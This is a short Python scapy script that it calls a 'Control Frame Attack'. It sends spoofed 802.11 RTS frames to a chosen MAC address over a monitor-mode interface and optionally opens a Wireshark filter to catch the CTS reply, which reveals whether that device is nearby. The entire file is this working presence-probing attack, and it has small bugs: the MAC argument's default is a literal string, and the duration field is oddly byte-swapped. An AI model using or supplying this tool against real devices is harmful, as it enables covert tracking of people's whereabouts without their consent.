#!/usr/bin/env python3

"""scapy:
srp(RadioTap()/Dot11(addr1='target', addr2='phony', type=1, subtype=11), iface='mon0')

wireshark:
(((wlan.fc.type_subtype == 27) && (wlan.ra == target)) && (wlan.ta == phony)) || ((wlan.fc.type_subtype == 28) && (wlan.ra == phony))
"""

import time
import shlex
import struct
import argparse
from scapy.utils import wireshark
from scapy.sendrecv import srp
from scapy.layers.dot11 import RadioTap, Dot11

target_mac = '11:22:33:44:55:66'
# target_mac = ''
phony_mac = '00:00:00:00:12:34'
# phony_mac = ''

bytes = struct.pack("<H", 123) # 123 microseconds
timeval = struct.unpack(">H", bytes)[0]

def parse_args():
    parser = argparse.ArgumentParser(
        description="Control Frame Attack to identify if a specific devices MAC is nearby."
    )
    parser.add_argument('-m', '--target-mac', dest='mac', default='target_mac',
                        help='Target devices MAC address')
    parser.add_argument('--wireshark', action='store_true',
                        help="Start a wireshark capture of the RTS and CTS packages")
    return parser.parse_args()


def main():
    args = parse_args()
    target_mac = args.mac

    if args.wireshark:
        flt = (
            f'(((wlan.fc.type_subtype == 27) && (wlan.ra == {target_mac})) && (wlan.ta == {phony_mac}))'
            f' || ((wlan.fc.type_subtype == 28) && (wlan.ra == {phony_mac}))'
        )
        cmd = shlex.split('-i mon0 -k --display-filter') + [flt]

        wshark = wireshark(None, args=cmd, getproc=True)

        start = time.perf_counter()
        while time.perf_counter() - start < 5:
            print(int(6-(time.perf_counter() - start)//1), end='\r')

    pkg = srp(
        RadioTap()/Dot11(
            addr1=target_mac,
            addr2=phony_mac,
            addr3=target_mac,
            addr4=target_mac,
            type=1, subtype=11, ID=timeval
        ),
        iface='mon0',
        timeout=10
    )
    print(pkg[0].display())


if __name__ == '__main__':
    main()
